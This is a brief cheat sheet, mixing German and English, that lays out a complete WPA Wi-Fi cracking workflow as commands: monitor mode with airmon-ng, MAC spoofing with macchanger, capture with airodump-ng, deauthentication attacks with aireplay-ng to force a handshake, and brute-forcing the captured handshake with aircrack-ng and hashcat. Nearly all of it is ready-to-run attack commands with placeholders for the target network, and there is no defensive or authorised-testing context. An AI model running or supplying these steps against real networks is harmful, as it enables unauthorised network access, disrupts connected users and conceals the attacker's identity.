# MONITORMODUS EINSCHALTEN
```
iwconfig
airmon-ng check
airmon-ng check kill
airmon-ng start wlan0
```

# MACCHANGER EINSCHALTEN
```
ifconfig
ifconfig wlan0mon down
macchanger -r wlan0mon
ifconfig wlan0mon up
ifconfig
```

# DUMPEN
```
airodump-ng wlanmon0
airodump-ng --bssid XXXXXXXXXXXX -c X -w XXXXXX wlan0mon
```
-c ist der channel




# DEAUTH
open second terminal and send deauth:
```
aireplay-ng -0 0 -a XXXXXXXXXXXX wlan0mon
```
or
```
aireplay-ng --deauth 5 -a XXXXXXXXXXXX wlan0mon
```
im idealfall haben wir jetzt den handshake.


# MANAGED MODE EINSCHALTEN
```
airmon-ng stop wlan0mon
airmon-ng
```

# BRUTE FORCE WITH AIRCRACK-NG
```
aircrack-ng wpahandshake.cap -w wordlist.txt
```


# HASHCAT

## CONVERT TO HASHCAT FORMAT
```
https://hashcat.net/cap2hccapx/
```

## BRUTE FORCE WITH HASHCAT
```
hashcat -m 2500 -a X /root/Downloads/XXXXXX.hccapx ?X?X?X?X?X?X?X?X 
(oderVerzeichnisderwordlist)
```

# HASHCAT POTFILE
`/home/fsociety/.hashcat/hashcat.potfile`
